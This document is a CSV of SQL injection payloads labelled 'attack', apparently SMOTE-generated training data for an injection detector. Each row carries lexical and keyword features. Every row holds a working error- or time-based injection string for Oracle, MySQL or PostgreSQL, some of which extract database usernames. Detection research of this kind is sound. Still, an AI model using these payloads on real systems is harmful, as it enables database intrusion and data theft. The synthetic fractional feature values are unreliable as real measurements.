id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,error,select   (  case when   (  3539  =  8768  )   then 3539 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000295,0.003321036159915687,133.0,30.0,3.7659147873144594,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000002,attack,error,"1'+  (  select zbyt where 4575  =  4575 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x   )    )   +'",nearest_attack_euclidean,R000273,1.4249895108482569,324.55476292104254,39.37773814605213,4.003285506117183,109.5775598032867,60.51095258420851,119.02190516841702,35.44434536513032,0.33783881788837744,0.18639651666869073,0.36660963182315,0.10915503361978182,1.3777381460521276,0.0,0.6222618539478724,-1.3877787807814457e-17,2.0,1.6888690730260638,0.0,21.377738146052128,0.0,0.0,6.0,6.688869073026064,0.6888690730260637,0.0,0.3111309269739362,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.688869073026064,3.0,0.6888690730260638,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.377738146052128
SMOTE_000003,attack,error,"1""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""nzhj"" like ""nzhj",nearest_attack_euclidean,R000155,0.3617035025568921,184.3761428504566,31.633226707638475,3.696898383798803,62.16613353819237,24.0,75.0658136611078,23.144195651156437,0.3372621429030456,0.13124899749959948,0.40618294785361353,0.12530591174374142,0.0,3.6332267076384737,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,15.510968943517966,0.0,0.0,4.0,0.0,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,-2.220446049250313e-16,0.0,0.0,-1.1102230246251565e-16,0.8777422358794913,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.877742235879491
SMOTE_000004,attack,error,"1'||  (  select 'mgel' where 3591  =  3591 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",nearest_attack_euclidean,R000234,0.30132515410799643,377.37120856172123,36.25758287655756,3.6066623854925806,96.0,57.0,159.0,65.37120856172122,0.25439296956317375,0.15104582567813443,0.4213383558390066,0.1732228489196852,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,3.0,0.0,32.0,0.0,0.0,1.0,26.371208561721218,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000005,attack,error,select   (  case when   (  3863  =  1151  )   then 3863 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000060,0.0006078746201309809,133.0,28.0,3.719728731283319,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000006,attack,error,"-5243"" where 2105  =  2105 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",nearest_attack_euclidean,R000046,0.7422526033551723,403.2201942058607,33.96980758877124,3.533407753153501,100.4742312524009,61.35346160748584,173.62519330854474,67.76730803742922,0.24915651626783358,0.1526560186907842,0.4301812678843297,0.1680061971570525,0.0,1.0,3.0,-1.3877787807814457e-17,0.0,3.0,0.0,35.73711562620045,0.0,0.0,0.3232691962570784,30.06038482245752,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.6767308037429214,0.0,1.0,1.6767308037429214,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.353461607485842
SMOTE_000007,attack,error,select   (  case when   (  5740  =  7636  )   then 5740 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000053,0.0,133.0,29.0,3.7536558766775228,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000008,attack,error,"-3415 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- jove",nearest_attack_euclidean,R000199,0.8553749505768313,338.37113489172646,35.17731906496411,3.493821302993071,82.35463812992822,50.90309208661881,146.83917769683416,58.2742269783453,0.24344784318878987,0.15047671246829405,0.43385679103819585,0.17221865330472025,0.0,0.0,3.0,-1.3877787807814457e-17,0.0,2.0,0.0,30.548453956690594,0.0,0.0,0.7257730216547036,25.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.7257730216547035,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2742269783452965,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000009,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000005,0.0,213.0,40.0,4.192633796617524,117.0,2.0,71.0,23.0,0.5492957746478874,0.009389671361502344,0.3333333333333333,0.107981220657277,3.0,0.0,0.0,-1.3877787807814457e-17,0.0,3.0,0.0,10.0,0.0,4.0,1.0,3.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000010,attack,error,"1'+  (  select nzij where 5456  =  5456 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   +'",nearest_attack_euclidean,R000138,0.8950297428940874,330.1398301989382,40.74237283183011,4.048446655709338,112.74237283183012,60.48474566366023,120.5415252875328,36.371186415915055,0.34172997877459615,0.18303528301968022,0.36502728512503313,0.11020745308069055,2.6288135840849436,0.0,0.0,-1.3877787807814457e-17,2.0,2.0,0.0,21.371186415915055,0.0,0.0,6.0,6.371186415915057,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.685593207957528,3.0,0.6855932079575282,1.0,1.3144067920424718,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.685593207957528
SMOTE_000011,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000005,0.0,213.0,40.0,4.192633796617524,117.0,2.0,71.0,23.0,0.5492957746478874,0.009389671361502344,0.3333333333333333,0.107981220657277,3.0,0.0,0.0,-1.3877787807814457e-17,0.0,3.0,0.0,10.0,0.0,4.0,1.0,3.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000012,attack,error,"  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select 1 from generate_series  (  9815,9815,case when   (  9815  =  9815  )   then 1 else 0 end  )   limit 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",nearest_attack_euclidean,R000254,0.03787364557280287,367.1665825935768,34.0,3.4379352844418585,95.0,50.08329129678839,162.0,60.08329129678839,0.258738727200034,0.13640399914521537,0.44121761901479484,0.16363965463995578,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,34.0,0.0,1.0,2.0832912967883885,21.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000013,attack,error,"-8838""   )    )    as xisn where 2749  =  2749 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",nearest_attack_euclidean,R000247,0.4383180238417455,376.3728099639326,33.0,3.393588205000206,85.16271900360674,55.51184298917977,173.02368597835954,62.674561992786515,0.22630419640290056,0.14747670298431195,0.4596998243479385,0.16651927626484897,0.0,1.0,2.8372809963932566,-1.3877787807814457e-17,0.0,3.0,0.0,33.83728099639326,0.0,0.0,0.0,25.837280996393254,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,-1.1102230246251565e-16,0.16271900360674363,0.8372809963932564,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
